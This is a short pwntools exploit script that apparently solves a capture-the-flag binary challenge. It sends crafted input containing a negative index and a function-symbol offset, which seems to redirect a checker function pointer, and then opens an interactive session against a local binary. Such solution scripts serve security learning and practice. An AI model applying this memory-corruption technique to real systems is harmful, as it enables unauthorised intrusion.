#!/usr/bin/env python3
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# HOST = ''
# PORT = 

binf = ELF(bin_file)

def attack(io):
    io.sendlineafter('>> ', chr(83) * 7 + chr(84) * 9)
    io.sendlineafter('.\n', str(-16) + ' ' + str(binf.sym.easy_checker - binf.sym.hard_checker))
    
def main():
    io = process(bin_file)
    #io = remote(HOST, PORT)
    attack(io)
    #gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
